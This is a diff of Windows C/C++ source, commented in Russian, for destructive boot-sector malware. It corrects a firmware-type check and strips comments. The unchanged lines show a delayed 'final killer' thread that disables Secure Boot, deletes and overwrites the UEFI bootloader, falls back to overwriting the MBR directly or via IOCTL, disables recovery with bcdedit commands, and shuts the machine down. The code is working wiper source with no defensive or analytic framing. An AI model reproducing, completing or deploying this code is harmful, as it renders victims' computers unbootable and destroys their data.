@@ -78,8 +78,11 @@ unsigned char mbr_code[512] = {
 
 // ====== 2. ПРОВЕРКА: БИОС ИЛИ UEFI ======
 bool IsUEFIBoot() {
-    UINT size = GetFirmwareType();
-    return (size == 0x02); // 0x02 = UEFI
+    FIRMWARE_TYPE firmwareType;
+    if (GetFirmwareType(&firmwareType)) {
+        return (firmwareType == FirmwareTypeUefi);
+    }
+    return false;
 }
 
 // ====== 3. ОТКЛЮЧЕНИЕ SECURE BOOT ======
@@ -167,11 +170,9 @@ bool WriteMBR_IOCTL() {
 
 // ====== 6. ПОДМЕНА ЗАГРУЗЧИКА (UEFI) ======
 bool ReplaceUEFIBoot() {
-    // Монтируем ESP
     system("mountvol X: /S 2>nul");
     Sleep(1000);
 
-    // Проверяем, смонтировался ли
     char paths[][256] = {
         "X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi",
         "X:\\EFI\\Boot\\bootx64.efi",
@@ -190,7 +191,6 @@ bool ReplaceUEFIBoot() {
     }
 
     if (!found) {
-        // Пробуем найти ESP вручную
         char drives[256];
         GetLogicalDriveStringsA(256, drives);
         for (int i = 0; i < 256; i += 4) {
@@ -209,14 +209,11 @@ bool ReplaceUEFIBoot() {
         return false;
     }
 
-    // Снимаем защиту
     system("attrib -h -s -r X:\\EFI\\Microsoft\\Boot\\*.* 2>nul");
     system("attrib -h -s -r X:\\EFI\\Boot\\*.* 2>nul");
 
-    // Пытаемся удалить старый загрузчик
     DeleteFileA(targetPath);
 
-    // Пишем новый
     HANDLE hFile = CreateFileA(
         targetPath,
         GENERIC_WRITE,
@@ -268,7 +265,6 @@ void KillBIOS() {
 
 // ====== 9. БЛОКИРУЕМ ВОССТАНОВЛЕНИЕ ======
 void BlockRecovery() {
-    // Отключаем восстановление при загрузке
     system("bcdedit /set {default} recoveryenabled No 2>nul");
     system("bcdedit /set {current} recoveryenabled No 2>nul");
     system("bcdedit /set {bootmgr} displaybootmenu No 2>nul");
@@ -278,28 +274,20 @@ void BlockRecovery() {
 
 // ====== 10. ФИНАЛЬНЫЙ УБИЙЦА ======
 DWORD WINAPI InjectMBR_Delayed(LPVOID) {
-    Sleep(120000); // 2 минуты
+    Sleep(120000);
 
-    // Шаг 1: Отключаем Secure Boot
     DisableSecureBoot();
 
-    // Шаг 2: Проверяем режим
     if (IsUEFIBoot()) {
-        // UEFI — подменяем загрузчик
         if (ReplaceUEFIBoot()) {
-            // Убиваем BCD
             KillBCD();
-            // Блокируем восстановление
             BlockRecovery();
-            // Перезагрузка
             system("shutdown /s /t 5");
             return 0;
         }
     }
 
-    // Шаг 3: BIOS или UEFI не сработал
     if (WriteMBR()) {
-        // Убиваем BCD и BIOS-загрузчики
         KillBCD();
         KillBIOS();
         BlockRecovery();
@@ -307,7 +295,6 @@ DWORD WINAPI InjectMBR_Delayed(LPVOID) {
         return 0;
     }
 
-    // Шаг 4: Последняя попытка через IOCTL
     if (WriteMBR_IOCTL()) {
         KillBCD();
         KillBIOS();
@@ -316,7 +303,6 @@ DWORD WINAPI InjectMBR_Delayed(LPVOID) {
         return 0;
     }
 
-    // Если ничего не сработало — просто перезагружаем
     system("shutdown /s /t 5");
     return 0;
 }
